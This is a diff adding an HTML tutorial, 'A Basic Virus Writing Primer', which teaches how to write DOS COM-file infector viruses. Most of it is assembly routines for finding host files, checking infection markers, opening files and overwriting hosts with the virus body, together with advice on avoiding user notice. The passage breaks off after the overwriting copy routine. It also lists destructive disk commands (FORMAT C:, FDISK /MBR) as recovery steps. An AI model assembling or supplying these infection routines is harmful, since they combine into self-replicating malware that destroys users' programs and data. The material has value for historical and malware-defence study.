@@ -1,0 +1,1100 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - A Basic Virus Writing Primer</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<P align="center"> <font color="#004080"><b><font size="+3">A Basic Virus Writing 
+  Primer </font><br>
+  <font size="+1">by Chili </font></b></font></P>
+<hr>
+<P>
+What horror  must the ignorant victim  undergo as it  becomes aware  of a being
+that lives inside its own body, growing ever stronger, reproducing itself until
+its host, unable to bear more finally colapses and dies an horrible death. What
+panic  it must  feel,  knowing nothing  can be  done  in time  to avoid  such a
+terrible fate.  A predator so tiny, that unsuspectedly it spreads from one host
+to  another,  by  so  rapidly  infecting  millions.  An  organism,  so  utterly
+resourceful and small, that it stays most of the time undetectable, breeding in
+the shadows.
+</P><P>
+Computer viruses aren't much  different from their biological counterpart,  but
+instead of infecting cells they infect files and boot sectors.  In this article
+I'll try to explain the basics of file viruses,  more specifically runtime (aka
+direct  action)  COM  infectors.   This  will  cover  most  simple  search  and
+replication  methods used and  is only to be  considered as an  introduction to
+virus writing.  After some thought I've decided not  to include any full source
+code  for a  working virus,  since anyone  with  half  a brain  and a  somewhat
+mediocre  knowledge of assembly can  easily build a virus out  of the pieces of
+code  that will  be presented.  Furthermore  it's not  my wish to  increase the
+number of viruses in the wild, thing that would undoubtedly happen by the hands
+of some I-have-no-brain-and-can't-program-hellspawn bent on random destruction.
+Anyway, on with the article...
+</P>
+<P> <b>Some Sort Of 'Programming Virii Safely' Guide</b></P>
+<P>
+The only really safe way  to program viruses  is to know what you're  doing and
+understand at  every time how the virus is behaving.  I mean,  if you're stupid
+enough to test a virus  on your own machine without fully comprehending its ins
+and outs, then you deserve to have your system trashed. It would be best if you
+had a second computer just for this purpose, since a buggy programming can lead
+to a lot of crashes and general havoc.  If not, a Ramdrive can be created and a
+Subst can be done,  so that all accesses to  physical drives are  redirected to
+the virtual one. Assuming that you want your Ramdrive to have 512-byte sectors,
+a limit of 1024 entries and to allocate 2048K of extended memory,  you must add
+this line to your CONFIG.SYS:
+</P><PRE>
+DEVICE=C:\DOS\RAMDRIVE.SYS 2048 512 1024 /E
+</PRE><P>
+Then you must copy COMMAND.COM  and SUBST.EXE to the Ramdrive so that DOS won't
+hang and also in order for you to be able to delete all redirections when done.
+And to associate all  physical drives to the newly  created virtual drive  (and
+assuming that it is D: and all your drives are A: and C:) you should do:
+</P><PRE>
+SUBST A: D:\
+SUBST C: D:\
+</PRE><P>
+Of course this last method isn't  perfect and is by no means a substitute for a
+brain.  You should always know how to  completely remove a virus before running
+it, or you'll end cleaning up the mess for quite some time.
+</P><P>
+Just use  common sense.  For example,  if  you're  writing a  virus aimed  at a
+specific file type,  all you have  to do is copy all files of that  type you do
+not wish to  be infected to a different extension and when  you're done testing
+just  switch those files  back to their original extension.  While testing  you
+should  also place breakpoints  and warning  messages throughout  the code,  so
+that you know at all times what  the virus is doing as well as it will help you
+debugging it. Also you should program and test different routines separately as
+it will reduce complexity and bug proneness.  Lastly the use of memory and disk
+mapping/editing utilities,  a set of good anti-virus and most important the use
+of backups is encouraged, so that you can keep track  of things and are able to
+restore your system in case something goes wrong.
+</P><P>
+In case things  get really out of hand  you should always  have a clean "rescue
+disk" which you should  create by doing a FORMAT A: /S /U and then copying into
+it some  useful DOS files  like FORMAT.COM,  UNFORMAT.COM, FDISK.EXE,  SYS.COM,
+MEM.EXE,  ATTRIB.EXE, DEBUG.EXE,  CHKDSK.EXE, SUBST.EXE,  a text editor just in
+case and whichever other  files you may find useful.  Also an anti-virus should
+be included along.  Don't forget to write protect the disk and put it in a safe
+place.  The first thing  you should  do in order to clean  up your system is to
+boot from  your  previously  created disk  and  use your  anti-virus clean  and
+restoration features, as most times this will work, saving you a lot of hassle.
+In last resort,  you should run FDISK /MBR to re-write the  executable code and
+error messages of the partition sector,  then run FDISK and first delete,  then
+create a new partion table and finally run FORMAT C: /S /U.  Your system should
+now be  completely clean and you can restore your backups at this time.  If all
+you want is to clean a floppy disk instead of a hard disk, then all you have to
+do is run FORMAT A: /S /U to create a new boot sector,  FAT and root directory.
+Of course that after this procedures all data will be lost, so as I said before
+this should only be used if you're really desperate.
+</P><P>
+Above all, don't forget to backup, backup, backup!
+</P>
+<P> <b>Tools & References</b></P>
+<P>
+In order to write and test a sucessful virus  you need some useful programs and
+references, such as:
+</P>
+<ul>
+  <li> An assembler (TASM, MASM, Intel's ASM86, A86, NASM, ...) - I recommend 
+    using Turbo Assembler, as all code I will provide will be tested with it. 
+  </li>
+  <li> A linker (TLINK, LINK, Intel's LINK86...) - Again I recommend Turbo Linker. 
+  </li>
+  <li> A debugger (Dos' DEBUG, TD, ...) - Dos' DEBUG is old but will do the job, 
+    you can use Turbo Debugger though, as it is somewhat better. </li>
+  <li> A text and a hex editor of your choice. </li>
+  <li> A disassembler (DEBUG, Sourcer, IDA, ...) - You can use Dos' DEBUG, but 
+    would be better if you used Sourcer which is very good or IDA which is excellent 
+    but very large in size. </li>
+  <li> Some other things like TSR Utilities by TurboPower Software, Norton Utilities 
+    and more. </li>
+  <li> A good set of Anti-Virus packages, such as ThunderBYTE Anti-Virus (as a 
+    great set of utilities to backup your bootsector, partition table and CMOS), 
+    AVP (AntiViral Toolkit Pro) and F-PROT. Also available are McAfee (now Network 
+    Associates, I think) VirusScan, Dr.Solomon's AVTK and Norton Anti-Virus. </li>
+  <li> Ralph Brown's x86/MSDOS Interrupt List, Norton Guides' Assembly Language 
+    database, David Jurgens' HelpPC, DOSREF (Programmers' Technical Reference 
+    for MSDOS and the IBM PC) and others you find useful. </li>
+</ul>
+<P> <b>On Viruses</b></P>
+<P>
+There are two things that must always be present on every working virus,  first
+the search routine that seeks for  suitable targets for the virus to infect and
+lastly the replication routine that copies the virus to the found target. Other
+routines may also be added in order to enhance the virus and the two more basic
+and  essencial parts  can be improved,  increasing its performance,  albeit its
+complexity too.
+</P><P>
+I intentionally left out a major routine, the payload (aka activation routine),
+though not necessary, it is present in almost all viruses.  Sincearely I see no
+real use for  most activation routines,  since all they do is seriously cripple
+the virus chance to spread.  Besides, all good payloads must be custom made (as
+should all viruses,  but that's another story...), so you'll have to build your
+own if  you want one.  For some old  good examples of  non-destructive payloads
+take a look at Ambulance Car, Cascade, Den Zuk, Corporate Life and Crucifixion.
+</P><P>
+All code presented hereafter was first tested on both of my machines and works,
+but this  doesn't mean that it will work on  all possible configurations,  so I
+can't fully guarantee that it won't ever cause unwanted damage. It's bad enough
+that  your virus  may unwillingly  trash someone's  data,  so don't go  writing
+destructive payloads just for the hell of it. Programming - and therefore virus
+writing - is an art, treat it as such.
+</P>
+<P> <b>A Word On Error Trapping</b></P>
+<P>
+Error trapping is regrettably one of the most forgotten things in viruses.  You
+should always  account for errors in order not to  crash and even trash things.
+This doesn't mean that you should present cute DOS-like error messages, as this
+would  alert the  user,  instead you  should  process  the information  and act
+accordingly. That most times just means that you should abort the virus ongoing
+operations and restore control back to the host.
+</P>
+<P> <b>Optimisation</b></P>
+<P>
+All code will be presented in an unoptimized form for ease of understanding and
+also because all routines are shown  seperate from each other so  that they are
+portable to  different kinds of viruses.  When writing a full virus  you should
+always optimize your code,  so that it takes as  less space as possible.  Don't
+use procedures unless you can save space by doing so.  Also don't use variables
+when you can use registers (for example the F_Handle variable needs not be used
+since you could just use the stack or some free register - see below).
+</P>
+<P> <b>Delta Offset</b></P>
+<P>
+When you're programming a virus that will always be placed at a fixed location,
+like overwriting  and prepending viruses,  you won't have to worry about any of
+this, but if you're writing a virus that relocates part of its code to a random
+location,  such as appending and midfile infectors,  you'll have to account for
+the  displacement.  This doesn't affect most  jumps and calls,  since they  are
+relative,  but data on the other hand is refered by an absolute offset.  Things
+would work fine the first  time you assembled and run the virus,  but not after
+the first infection when all memory addresses would then be changed.
+</P><P>
+To account for this all one has to do is:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Delta_Offset:
+        call    Find_Displacement
+Find_Displacement:
+        pop     bp
+        sub     bp, offset Find_Displacement
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+What this piece of code does is, first issue a CALL to the next instruction, so
+the IP (Instruction Pointer) for it will pushed into the stack,  next we POP it
+to the  register BP  (it is good programming  to use BP,  which stands for Base
+Pointer), and finally we SUBtract the original OFFSET determined when the virus
+was compiled.  Of course the first time the virus is run, the displacement will
+be zero, only on subsequent runs will it change according to the host size.
+</P><P>
+I'll be presenting code for infectors that require delta offset calculation, so
+for all the other infectors that don't, in order to accommodate any of the code
+presented hereafter you'll just have to strip out any displacement calculations
+as in the following examples:
+</P><PRE>
+Replace
+        lea     dx, [bp+offset DTA]
+With
+        lea     dx, DTA
+
+Replace
+        mov     word ptr [bp+F_Handle], ax
+With
+        mov     F_Handle, ax
+</PRE><P>
+Once you've given it a little thought and figured it out it's not as hard as it
+may  first seem.  Of course that  even if you're  programming a  fixed location
+virus you  can still leave all code as if you were writing one that  needed you
+to  calculate  the  delta  offset,  since  the  displacement  is  always  zero.
+Nevertheless you shouldn't do this,  mainly because it adds unnecessary size to
+the virus and it is extremely sloppy (and lazy) programming (copying?!?!).
+</P>
+<P> <b>.COM File Structure</b></P>
+<P>
+COM files are raw binary executables,  designed for compatibility  with the old
+CP/M operating system.  Whenever a COM file is executed, DOS first sets aside a
+segment (64K) of memory for it,  then builds a PSP  (Program Segment Prefix) in
+the first  256 bytes,  after which the  program is loaded into.  Before passing
+control to the program DOS does some things first, among which are:
+</P><PRE>
+   1) Register AX  reflects the validity  of drive specifiers  entered with the
+      first two parameters as follows:
+        AL=0FFh if the  first parameter  contained an invalid drive  specifier,
+                otherwise AL=00h
+        AL=0FFh if the second  parameter contained an invalid  drive specifier,
+                otherwise AL=00h
+ 
+   2) All four segment registers contain the segment address of the PSP control
+      block
+
+   3) The Instruction Pointer (IP) is set to 100h
+
+   4) The SP register is set to the  end of the program's segment and a word of
+      zeroes is placed on top of the stack
+</PRE><P>
+In case  any of  this  things  are  changed  during  the virus  execution,  you
+shouldn't forget to restore them before passing control back to the host.
+</P><P>
+So, given this, a COM file program can only have a maximum size of 65277 bytes,
+since you have to account for the PSP and  at least for the two  bytes occupied
+by the stack.  Here is how a COM file looks when loaded in memory:
+</P><PRE>
+   FFFFh +--------------------+
+   FFFEh |                    | &lt;- SP
+         |       Stack        |
+         |                    |
+         +--------------------+
+         |                    |
+         | Uninitialized Data |
+         |                    |
+         +--------------------+
+         |                    |
+         |   COM File Image   |
+         |                    |
+    100h +--------------------+ &lt;- IP
+         |                    |
+         |        PSP         |
+         |                    |
+      0h +--------------------+ &lt;- CS, DS, ES, SS
+</PRE><P>
+Don't forget to account for  stack growth needed by your program as well as any
+uninitalized data, for if you don't there is a chance that it will crash, since
+the stack  may grow large  enough to overwrite  data or code,  or your data may
+wrap around and overwrite the PSP and the code.
+</P>
+<P> <b>Program Segment Prefix (PSP)</b></P>
+<P>
+A PSP is created  by DOS for all programs and contains  most of the information
+one needs to know about them. Its structure looks like this:
+</P><PRE>
+   [ PSP - Program Segment Prefix ]
+
+   Offset       Size            Description
+   ------       ----            -----------
+   0h           Word            INT 20h instruction
+   2h           Word            Segment address of top of the current program's
+                                allocated memory
+   4h           Byte            Reserved
+   5h           Byte            Far call to DOS function dispatcher (INT 21h)
+   6h           Word            Available bytes in the segment for .COM files
+   8h           Word            Reserved
+   Ah           Dword           INT 22h termination address
+   Eh           Dword           INT 23h Ctrl-Break handler address
+   12h          Dword           DOS 1.1+ INT 24h critical error handler address
+   16h          Byte            Segment of parent PSP
+   18h       20 Bytes           DOS 2+ Job File Table (one byte per file handle
+                                FFh = available/closed)
+   2Ch          Word            DOS 2+ segment address of  process' environment
+                                block
+   2Eh          Dword           DOS 2+ process' SS:SP  on entry to last INT 21h
+                                function call
+   32h          Word            DOS 3+ number of entries in JFT
+   34h          Dword           DOS 3+ pointer to JFT
+   38h          Dword           DOS 3+ pointer to previous PSP
+   3Ch       20 Bytes           Reserved
+   50h        3 Bytes           DOS 2+ INT 21h/RETF instructions
+   53h        9 Bytes           Unused
+   5Ch       16 Bytes           Default unopened File Control Block 1 (FCB1)
+   6Ch       16 Bytes           Default unopened File Control Block 2 (FCB2)
+   7Ch        4 Bytes           Unused
+   80h          Byte            Command line length in bytes
+   81h      127 Bytes           Command line (ends with a Carriage Return 0Dh)
+</PRE><P>
+Note:  For a more  detailed explanation  of the  PSP structure,  including many
+undocumented features, see Ralph Brown's x86/MSDOS Interrupt List.
+</P><P>
+And here are the default file handles for the Job File Table (JFT):
+</P><PRE>
+   [ DOS Default/Predefined File Handles]
+
+   0 - Standard Input Device, can be redirected (STDIN)
+   1 - Standard Output Device, can be redirected (STDOUT)
+   2 - Standard Error Device, can be redirected (STDERR)
+   3 - Standard Auxiliary Device (STDAUX)
+   4 - Standard Printer Device (STDPRN)
+</PRE><P>
+The  File Control Block  (FCB)  and the  Environment Block  structures will  be
+covered on a later article, as they aren't needed for now.
+
+</P>
+<P> <b>Disk Transfer Area (DTA)</b></P>
+<P>
+For all  file reads and writes  performed using FCB function calls,  as well as
+for "Find First"  and "Find Next" calls  using FCBs or not,  DOS uses a  memory
+buffer called Disk Transfer Area,  which is by default located at offset 80h in
+the PSP and is 128 bytes long (this area is also used by the command tail),  so
+in order  not to interfere with  whichever command line parameters  there might
+be,  the Disk Transfer Address should be set to a different location in memory.
+This is done like this:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Set_DTA:
+        mov     ah, 1Ah
+        lea     dx, [bp+offset DTA]
+        int     21h
+---------------------------------------------------------------------------8&lt;--
+
+;Interrupt:     21h
+;Function:      1Ah     - Set Disk Transfer Address (DTA)
+;On entry:      AH      - 1Ah
+;               DS:DX   - Address of DTA
+;Returns:       Nothing
+</PRE><P>
+Of course  that before passing control  back to the host you should restore the
+Disk Transfer Address back to its original value:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Restore_DTA:
+        mov     ah, 1Ah
+        mov     dx, 80h
+        int     21h
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+A sufficient  buffer area  should always  be reserved,  as DOS will  detect and
+abort any disk transfers that would  fall off the end of the current segment or
+wrap around within the segment.
+</P>
+<P> <b>FindFirst Data Block</b></P>
+<P>
+Upon a  successful "Find First Matching File"  function call the  Disk Transfer
+Area is filled with a  FindFirst Data Block which contains info on the matching
+file found, also after a  "Find Next Matching File" function call  that data is
+updated. As we'll only be using the DTA for this, all we need to when setting a
+new one is to have a 43 bytes long buffer so that we can allocate the FindFirst
+Data Block:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+DTA:
+   Reserv       db      21      dup     (?)
+   F_Attr       db      (?)
+   F_Time       dw      (?)
+   F_Date       dw      (?)
+   F_Size       dd      (?)
+   F_Name       db      13      dup     (?)
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+And here is the FindFirst Data Block structure:
+</P><PRE>
+   [ FindFirst Data Block ]
+
+   Offset       Size            Description
+   ------       ----            -----------
+   0h        21 Bytes           Reserved  for DOS  use on subsequent  Find Next
+                                calls - is different per DOS version
+   15h          Byte            Attribute of matching file
+   16h          Word            File time stamp
+   18h          Word            File date stamp
+   1Ah          Dword           File size in bytes
+   1Eh       13 Bytes           ASCIIZ filename and extension
+</PRE><P>
+The file attribute field looks like this:
+</P><PRE>
+   [File Attribute]
+
+   Bit(s)                       Description
+   ------                       -----------
+   7 6 5 4 3 2 1 0
+   . . . . . . . 1              Read-only
+   . . . . . . 1 .              Hidden
+   . . . . . 1 . .              System
+   . . . . 1 . . .              Volume label
+   . . . 1 . . . .              Directory
+   . . 1 . . . . .              Archive
+   x x . . . . . .              Unused
+</PRE><P>
+The file time field is like this:
+</P><PRE>
+   [File Time]
+
+   Bit(s)                               Description
+   ------                               -----------
+   F E D C B A 9 8 7 6 5 4 3 2 1 0
+   . . . . . . . . . . . x x x x x      Seconds/2 (0..29) - 2 second increments
+   . . . . . x x x x x x . . . . .      Minutes (0..59)
+   x x x x x . . . . . . . . . . .      Hours (0..23)
+</PRE><P> 
+And finally the file date field like this:
+</P><PRE>
+   [File Date]
+
+   Bit(s)                               Description
+   ------                               -----------
+   F E D C B A 9 8 7 6 5 4 3 2 1 0
+   . . . . . . . . . . . x x x x x      Day (1..31)
+   . . . . . . . x x x x . . . . .      Month (1..12)
+   x x x x x x x . . . . . . . . .      Year since 1980 (0..119)
+</PRE>
+<P> <b>Current Directory Preservation</b></P>
+<P>
+If you're searching  for files outside the  directory where your virus  was run
+from, you must save the old directory and restore it when you're done. First to
+save it you must do:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Get_Directory:
+        mov     ah, 47h
+        mov     dl, 0
+        lea     si, [bp+offset Orig_Dir]
+        int     21h
+        jnc     Find_First
+        jmp     Return_Control
+---------------------------------------------------------------------------8&lt;--
+
+;Interrupt:     21h
+;Function:      47h     - Get Current Directory
+;On entry:      AH      - 47h
+;               DL      - Drive number (0=default, 1=A, etc.)
+;               DS:SI   - Pointer to a 64-byte buffer
+;Returns:       AX      - Error code, if CF is set
+;Error codes:   15      - Invalid drive specified
+;Notes: This  function returns  the full  pathname  of the  current  directory,
+;       excluding  the drive designator and initial backslash character,  as an
+;       ASCIIZ string at the memory buffer pointed to by DS:SI.
+</PRE><P>
+A 64 byte long buffer must be present to hold the original directory:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Orig_Dir        db      64    dup     (?)
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+Then before actually restoring to the old directory, you must first change to
+the root directory and then restore from there, since all paths are relative to
+it.
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+ChangeTo_Root:
+        mov     ah, 3Bh
+        lea     dx, [bp+offset Root]
+        int     21h
+        jc      Restore_DTA
+---------------------------------------------------------------------------8&lt;--
+
+;Interrupt:     21h
+;Function:      3Bh     - Change Directory (CHDIR)
+;On entry:      AH      - 3Bh
+;               DS:DX   - Pointer  to name of  new  default  directory  (ASCIIZ
+;                         string)
+;Returns:       AX      - Error code, if CF is set
+;Error Codes:   3       - Path not found
+;Notes: This function changes the current directory to the directory whose path
+;       is specified in the  ASCIIZ string at address DS:DX;  the string length
+;       is limited to 64 characters.  The path name may include a drive letter.
+</PRE><P>
+A buffer containing a ASCIIZ string representing the root:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Root            db      '\', 0
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+And finally you switch to the original directory  (if the original directory is
+the root there  will be an error since  the path won't be valid -  this doesn't
+matter since we changed to root before):
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Restore_Directory:
+        mov     ah, 3Bh
+        lea     dx, [bp+offset Orig_Dir]
+        int     21h
+        ;jc      Restore_DTA            ;No need, since it's right after
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+If you change drives while searching for files to infect  (this will be covered
+in a next article) you should also preserve the original drive and then restore
+it in the end.
+</P>
+<P> <b>File Search Techniques</b></P>
+<P>
+A runtime  virus  can  infect  files  located  in  the  current  directory,  in
+subdirectories,  maybe only in root,  in the PATH and even on different drives.
+You must  be very careful when writing  your search routine,  since if you only
+infect files  in a few places your  virus won't spread much,  but if you search
+for files to infect in every possible place, after the first infections it will
+start to take much  longer to find new hosts  (since most are already infected)
+and  disk activity might  last for long  enough to be  noticeable. Some of this
+techniques are presented below. The others will be presented on a next article.
+</P>
+<P> <b>Find First/Find Next</b></P>
+<P>
+This is used when you want to search for files on a the current directory.  You
+start by searching for the first matching COM file with normal attributes:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Find_First:
+        mov     ah, 4Eh
+        mov     cx, 0
+        lea     dx, [bp+offset COM_Mask]
+        int     21h
+        jnc     Open_File
+        jmp     Return_Control
+---------------------------------------------------------------------------8&lt;--
+
+;Interrupt:     21h
+;Function:      4Eh     - Find First Matching File (FIND FIRST)
+;On entry:      AH      - 4Eh
+;               CX      - File attribute
+;               DS:DX   - Pointer to filespec (ASCIIZ string)
+;Returns:       AX      - Error code, if CF is set
+;Error codes:   2       - File not found
+;               3       - Path not found
+;               18      - No more files to be found
+;Notes: If CX  is 0,  the function  searches  for  normal  files  only.  If  CX
+;       specifies any combination of the hidden, system, or directory attribute
+;       bits,  the search matches  normal files and  also any files with  those
+;       attributes.  If CX specifies the  volume label attribute,  the function
+;       looks only for entries with the volume label attribute. The archive and
+;       read-only attribute bits have no effect on the search operation.
+</PRE><P>
+A buffer holding the filespec must be present:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+COM_Mask        db      "*.COM", 0
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+Then if  you're not done  infecting or if  the file didn't  pass your infection
+criteria you can look for some more files matching the same specifications:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Find_Next:
+        mov     ah, 4Fh
+        int     21h
+        jc      Return_Control          ;Replace with  'jc ChangeTo_Parent'  if
+                                        ; using the "dot dot" method
+        jmp     Open_File
+---------------------------------------------------------------------------8&lt;--
+
+;Interrupt:     21h
+;Function:      4Fh     - Find Next Matching File (FIND NEXT)
+;On entry:      AH      - 4Fh
+;Returns:       AX      - Error code, if CF is set
+;Error codes:   18      - No more files to be found
+
+</PRE>
+<P> <b>"Dot Dot"</b></P>
+<P>
+If you wish to infect files on  different directories one curious and very easy
+way  of  doing so  is using  the "dot dot"  method  which  jumps to  the parent
+directory until your virus is satisfied or until it reaches the root:
+</P>
+<pre>--8&lt;--------------------------------------------------------------------------- 
+ChangeTo_Parent:
+         mov     ah, 3Bh
+         lea     dx, [bp+offset Parent_Dir]
+         int     21h
+         jc      Return_Control
+         jmp     Find_First
+---------------------------------------------------------------------------8&lt;-- </pre>
+<P>
+A buffer representing the parent directory in ASCIIZ string format must exist:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Parent_Dir      db      "..", 0
+---------------------------------------------------------------------------8&lt;--
+</PRE>
+<P> <b>Infection Criteria</b></P>
+<P>
+Since a COM file is always less  than 65536 bytes it's easy to compare its size
+against our criteria.  Don't forget that you  must account for the  virus size,
+the stack, the PSP (just in case) and any uninitialized data:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Check_Size:
+        cmp     word ptr [bp+F_Size+2], 0
+        je      Check_PlusVirus
+        jmp     Close_File
+Check_PlusVirus:
+        mov     ax, word ptr [bp+F_Size]
+        add     ax, offset Virus_End - offset Virus_Start + 4 + 256 + 109
+        jnc     PointTo_Begin
+        jmp     Close_File
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+Other criterias will be covered on later articles.
+
+</P>
+<P> <b>Opening/Closing the Host</b></P>
+<P>
+For now we will not worry about read-only files, so we will open the file in
+read/write mode as this will fail on read-only files:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Open_File:
+        mov     ah, 3Dh
+        mov     al, 00000010B
+        lea     dx, [bp+offset F_Name]  ;Replace  with  'mov dx, 9Eh'  for  the
+                                        ; overwriting virus since the file name
+                                        ; in the DTA is in the PSP (80h+1Eh)
+        int     21h
+        jnc     Save_Handle
+        jmp     Find_Next
+Save_Handle:
+        mov     word ptr [bp+F_Handle], ax
+---------------------------------------------------------------------------8&lt;--
+
+;Interrupt:     21h
+;Function:      3Dh     - Open a File
+;On entry:      AH      - 3Dh
+;               AL      - Open mode
+;               DS:DX   - Pointer to filename (ASCIIZ string)
+;Returns:       AX      - File handle
+;                         Error code, if CF is set
+;Error codes:   1       - Function number invalid
+;               2       - File not found
+;               3       - Path not found
+;               4       - No handle available
+;               5       - Access denied
+;               12      - Open mode invalid
+;Notes: The function opens any existing file,  including hidden files, and sets
+;       the record size to 1 byte.
+</PRE><P>
+And here is the format of the open mode byte:
+</P><PRE>
+   [Open Mode]
+
+   Bit(s)               Open Mode               Description
+   ------               ---------               -----------
+   7 6 5 4 3 2 1 0
+   . . . . . x x x      Access mode             Read/Write access
+   . . . . x . . .      Reserved                Must always be zero
+   . x x x . . . .      Sharing mode            Must be 0 in DOS 2.x
+   x . . . . . . .      Inheritance flag        Must be 0 in DOS 2.x
+
+   [Access Mode]
+
+   Bit(s)       Access Mode
+   ---          -----------
+   2 1 0
+   0 0 0        Read-only access
+   0 0 1        Write-only access
+   0 1 0        Read/write access
+
+   [Sharing Mode]
+
+   Bit(s)       Sharing Mode
+   ---          ------------
+   6 5 4
+   0 0 0        Compatibility mode
+   0 0 1        Deny Read/Write mode (Exclusive mode)
+   0 1 0        Deny Write mode
+   0 1 1        Deny Read mode
+   1 0 0        Deny None mode
+
+   [Inheritance Flag]
+
+   Bit          Inheritance Flag
+   ---          ----------------
+   7
+   0            File is inherited by child processes
+   1            File is not inherited
+</PRE><P>
+There should be a buffer for the file handle:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+F_Handle        dw      (?)
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+And when you're done with the file you close it:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Close_File:
+        mov     ah, 3Eh
+        mov     bx, word ptr [bp+F_Handle]
+        int     21h
+        jnz     Return_Control          ;Because of the &lt;Copy_Body&gt; routine
+        jnc     Find_Next
+        jmp     Return_Control
+---------------------------------------------------------------------------8&lt;--
+
+;Interrupt:     21h
+;Function:      3Eh     - Close a File Handle
+;On Entry:      AH      - 3Eh
+;               BX      - File handle
+;Returns:       AX      - Error code, if CF is set
+;Error codes:   6       - Invalid handle
+;Notes: This function flushes the file's buffers, closes the file, releases the
+;       handle, and updates the directory.
+
+</PRE>
+<P> <b>Self-Recognition</b></P>
+<P>This is very important, since if you don't check for prior infection you might 
+  end up making the host grow beyond the maximum permitted size. There are a number 
+  of ways of doing this, you can check for some sort of marker, a time stamp can 
+  be placed on the host and others. Only the marker method will be covered in 
+  this article. </P>
+<P> <b>Marker Byte</b></P>
+<P>
+The marker byte is  located at the beginning of  the file and is preceded  by a
+jump to  the real start of  the virus  (it has to be coded  "manually" since it
+doesn't assemble correctly):
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Host:
+        db      0E9h, 2, 0              ;This  is a near  jump to  Virus_Start,
+                                        ; which is  supposed to be  right after
+                                        ; the ID marker
+        db      'ID'
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+To read the first five bytes of an open file this is what you do:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Read_Five:
+        mov     ah, 3Fh
+        mov     bx, word ptr [bp+F_handle]
+        mov     cx, 5
+        lea     dx, [bp+offset IDMark]
+        int     21h
+        jnc     And_Also
+        jmp     Close_File
+And_Also:
+        cmp     cx, ax
+        jz      Check_IDMark
+        jmp     Close_File
+---------------------------------------------------------------------------8&lt;--
+
+;Interrupt:     21h
+;Function:      3Fh     - Read from File or Device, Using a Handle
+;On entry:      AH      - 3Fh
+;               BX      - File handle
+;               CX      - Number of bytes to read
+;               DS:DX   - Address of buffer
+;Returns:       AX      - Number of bytes read, or
+;                         Error code, if CF is set
+;Error codes:   5       - Access denied
+;               6       - Invalid handle
+;Network: Requires Read access rights
+;Notes: Data is read  starting at the location  pointed to by the file pointer.
+;       The file  pointer is  incremented by the  number of bytes read.  If the
+;       Carry Flag is  not set and AX = 0,  the file pointer was  at the end of
+;       the file  when the function  was called.  If the Carry Flag  is not set
+;       and AX is less than the number of bytes requested,  either the function
+;       read to the end of the file, or an error occurred.
+</PRE><P>
+A 5 bytes long buffer must exist (this will hold a dummy host the first time it
+is run - all it does is exit to DOS):
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+IDMark          db      0CDh, 20h, 90h, 90h, 90h
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+And to see if a valid ID marker exists in the five bytes read:
+</P><PRE> 
+--8&lt;---------------------------------------------------------------------------
+Check_IDMark:
+        cmp     word ptr [bp+IDMark+3], 'DI'
+        jnz     Check_Size
+        jmp     Close_File
+---------------------------------------------------------------------------8&lt;--
+</PRE>
+<P> <b>Parasitic Replication Methods</b></P>
+<P>
+Only two examples  of parasitic viruses will be covered,  first the overwriting
+which doesn't need any displacement  calculations and after the appending virus
+that needs those calculations. Other types of parasitic viruses such as midfile
+infectors,  prepending viruses  as non-parasitic  ones such  as companion  (aka
+spawning) viruses will be covered on future articles.
+</P>
+<P> <b>An Overwriting Virus</b></P>
+<P>
+As its  name says,  this type of virus  overwrites part of its host,  making it
+unnable to execute as  it is destroyed beyond repair.  And here is how it works
+(credit goes to Dark Angel for this nifty drawing):
+</P><PRE>
+   +---------------+   +-------+   +---------------+
+   | P R O G R A M | + | VIRUS | = | VIRUS | R A M |
+   +---------------+   +-------+   +---------------+
+</PRE><P>
+We won't really care about reinfection with this type of virus,  since there is
+no more file growth and also because  this virus is easily noticed.  An outline
+for a overwriting virus looks like this:
+</P><PRE>
+   1. &lt;Find_First&gt; file
+   2. &lt;Open_File&gt; in read/write mode
+   3. &lt;Copy_Body&gt; of virus over the host
+   4. &lt;Close_File&gt; handle
+   5. &lt;Find_Next&gt; file
+      (a) If another file found then goto step 2
+   6. &lt;Return_Control&gt; back to DOS
+</PRE><P>
+Here is the copy routine  for the overwriting virus  (don't forget to strip out
+the displacement calculations for this type of viruses):
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Copy_Body:
+        mov     ah, 40h
+        mov     bx, word ptr [bp+F_Handle]
+        mov     cx, Virus_End - Virus_Start
+        lea     dx, [bp+offset Virus_Start]
+        int     21h
+        ;jc      Close_File             ;No need since it's right after
+        cmp     cx, ax
+        ;jnz     Return_Control         ;Place  this  after  the   &lt;Close_File&gt;
+                                        ; routine,  since you  shouldn't  leave
+                                        ; unclosed file handles
+---------------------------------------------------------------------------8&lt;--
+
+;Interrupt:     21h
